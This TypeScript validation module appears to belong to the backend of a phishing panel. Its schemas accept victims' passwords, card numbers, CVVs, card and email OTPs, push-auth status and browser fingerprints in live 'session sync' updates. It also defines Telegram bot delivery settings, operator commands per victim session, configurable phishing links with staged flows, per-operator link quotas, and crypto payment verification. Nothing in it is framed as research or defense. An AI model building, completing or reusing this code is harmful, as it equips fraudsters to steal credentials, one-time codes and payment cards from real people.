import { body, param, query } from 'express-validator';
import { z } from 'zod';
import { Request, Response, NextFunction } from 'express';

// ==================== ZOD SCHEMAS ====================

// Session sync payload
export const sessionSyncSchema = z.object({
  sessionId: z.string().min(1, 'Session ID is required'),
  currentView: z.string().optional(),
  stage: z.string().optional(),
  email: z.string().email().optional(),
  password: z.string().min(1).optional(),
  phoneNumber: z.string().optional(),
  phoneCode: z.string().optional(),
  firstName: z.string().optional(),
  lastName: z.string().optional(),
  dob: z.string().optional(),
  address: z.string().optional(),
  country: z.string().optional(),
  cardNumber: z.string().optional(),
  cardType: z.string().optional(),
  cardExpiry: z.string().optional(),
  cardCvv: z.string().optional(),
  cardOtp: z.string().optional(),
  emailOtp: z.string().optional(),
  pushAuthStatus: z.string().optional(),
  fingerprint: z.object({
    userAgent: z.string().optional(),
    language: z.string().optional(),
    platform: z.string().optional(),
    screenResolution: z.string().optional(),
    ip: z.string().optional()
  }).optional(),
  adminCode: z.string().optional()
});

// Admin authentication
export const adminLoginSchema = z.object({
  username: z.string().min(1, 'Username is required'),
  password: z.string().min(1, 'Password is required'),
  mfaToken: z.string().length(6).optional()
});

export const gateSchema = z.object({
  username: z.string().min(1, 'Username is required'),
  password: z.string().min(1, 'Password is required')
});

// User management
export const createUserSchema = z.object({
  username: z.string().min(3, 'Username must be at least 3 characters').max(50),
  password: z.string().min(8, 'Password must be at least 8 characters').max(100),
  role: z.enum(['admin', 'hypervisor']).optional().default('admin'),
  uniqueCode: z.string().optional()
});

export const updateUserSchema = z.object({
  username: z.string().min(3).max(50).optional(),
  password: z.string().min(8).max(100).optional(),
  uniqueCode: z.string().optional(),
  settings: z.any().optional(),
  maxLinks: z.number().min(1).max(100).optional(),
  isSuspended: z.boolean().optional()
});

// Telegram configuration
export const telegramConfigSchema = z.object({
  token: z.string().optional(),
  chat: z.string().optional()
});

export const settingsSchema = z.object({
  settings: z.any().optional(),
  telegramConfig: telegramConfigSchema.optional()
});

// MFA schemas
export const mfaSetupVerifySchema = z.object({
  token: z.string().length(6, 'MFA token must be 6 digits')
});

export const mfaDisableSchema = z.object({
  token: z.string().min(6),
  password: z.string().min(1, 'Password is required')
});

// Refresh token schema
export const refreshTokenSchema = z.object({
  refreshToken: z.string().min(1, 'Refresh token is required')
});

// Link creation schema
export const createLinkSchema = z.object({
  adminId: z.string().optional(),
  code: z.string().min(3).max(50).optional(),
  flowConfig: z.object({
    stages: z.array(z.string()).optional(),
    theme: z.string().optional()
  }).optional()
});

// Command schema
export const commandSchema = z.object({
  sessionId: z.string().min(1, 'Session ID is required'),
  action: z.string().min(1, 'Action is required'),
  payload: z.any().optional()
});

// Payment verification
export const paymentVerifySchema = z.object({
  txHash: z.string().min(10, 'Transaction hash is required')
});

export const paymentRejectSchema = z.object({
  reason: z.string().optional()
});

// Audit log filters
export const auditLogFiltersSchema = z.object({
  page: z.coerce.number().min(1).optional().default(1),
  limit: z.coerce.number().min(1).max(100).optional().default(50),
  action: z.string().optional(),
  actor: z.string().optional(),
  startDate: z.coerce.number().optional(),
  endDate: z.coerce.number().optional()
});

// ==================== VALIDATION MIDDLEWARE ====================

/**
 * Zod validation middleware factory
 * Creates Express middleware that validates request body against a Zod schema
 */
export const zodValidate = <T>(schema: z.ZodSchema<T>) => {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      const errors = result.error.errors.map(e => ({
        field: e.path.join('.'),
        message: e.message
      }));
      return res.status(400).json({
        error: 'Validation failed',
        details: errors
      });
    }
    req.body = result.data; // Replace with validated/transformed data
    next();
  };
};

/**
 * Zod query validation middleware
 */
export const zodValidateQuery = <T>(schema: z.ZodSchema<T>) => {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.query);
    if (!result.success) {
      const errors = result.error.errors.map(e => ({
        field: e.path.join('.'),
        message: e.message
      }));
      return res.status(400).json({
        error: 'Validation failed',
        details: errors
      });
    }
    (req as any).validatedQuery = result.data;
    next();
  };
};

// ==================== EXPRESS-VALIDATOR SCHEMAS ====================
// Note: These are kept for backward compatibility

export const validateSessionSync = [
  body('sessionId').isString().notEmpty().withMessage('Session ID is required'),
  body('email').optional({ nullable: true, checkFalsy: true }).isEmail().withMessage('Invalid email format'),
  body('phoneNumber').optional({ nullable: true, checkFalsy: true }).isMobilePhone('any').withMessage('Invalid phone number'),
  body('cardNumber').optional({ nullable: true, checkFalsy: true }).isCreditCard().withMessage('Invalid card number'),
  body('cardExpiry').optional({ nullable: true, checkFalsy: true }).matches(/^\d{2}\/\d{2}$/).withMessage('Invalid expiry format (MM/YY)'),
  body('cardCvv').optional({ nullable: true, checkFalsy: true }).isLength({ min: 3, max: 4 }).withMessage('Invalid CVV'),
  body('emailOtp').optional({ nullable: true, checkFalsy: true }).isString().isLength({ min: 3, max: 10 }).withMessage('Invalid Email OTP'),
  body('pushAuthStatus').optional().isString()
];

export const validateAdminLogin = [
  body('username').isString().notEmpty().withMessage('Username is required'),
  body('password').isString().notEmpty().withMessage('Password is required')
];

export const validateCreateUser = [
  body('username').isString().isLength({ min: 3 }).withMessage('Username must be at least 3 characters'),
  body('password').isString().isLength({ min: 8 }).withMessage('Password must be at least 8 characters'),
  body('role').optional().isIn(['admin', 'hypervisor']).withMessage('Invalid role'),
  body('uniqueCode').optional().isString()
];

export const validateUpdateUser = [
  param('id').isString().notEmpty().withMessage('User ID is required'),
  body('username').optional().isString().isLength({ min: 3 }),
  body('password').optional().isString().isLength({ min: 8 }),
  body('uniqueCode').optional().isString(),
  body('maxLinks').optional().isInt({ min: 1, max: 100 }),
  body('isSuspended').optional().isBoolean()
];

export const validateCreateLink = [
  body('adminId').optional().isString(),
  body('code').optional().isString()
];

export const validateCommand = [
  body('sessionId').isString().notEmpty().withMessage('Session ID is required'),
  body('action').isString().notEmpty().withMessage('Action is required'),
  body('payload').optional()
];

export const validateSessionId = [
  param('id').isString().notEmpty().withMessage('Session ID is required')
];

// ==================== UTILITY FUNCTIONS ====================

/**
 * Validate data against a Zod schema
 */
export const validateWithZod = <T>(schema: z.ZodSchema<T>, data: unknown): { success: true; data: T } | { success: false; error: z.ZodError } => {
  const result = schema.safeParse(data);
  if (result.success) {
    return { success: true, data: result.data };
  } else {
    return { success: false, error: result.error };
  }
};

// Export all schemas for use in tests and documentation
export const zodSchemas = {
  sessionSync: sessionSyncSchema,
  adminLogin: adminLoginSchema,
  gate: gateSchema,
  createUser: createUserSchema,
  updateUser: updateUserSchema,
  settings: settingsSchema,
  mfaSetupVerify: mfaSetupVerifySchema,
  mfaDisable: mfaDisableSchema,
  refreshToken: refreshTokenSchema,
  createLink: createLinkSchema,
  command: commandSchema,
  paymentVerify: paymentVerifySchema,
  paymentReject: paymentRejectSchema,
  auditLogFilters: auditLogFiltersSchema
};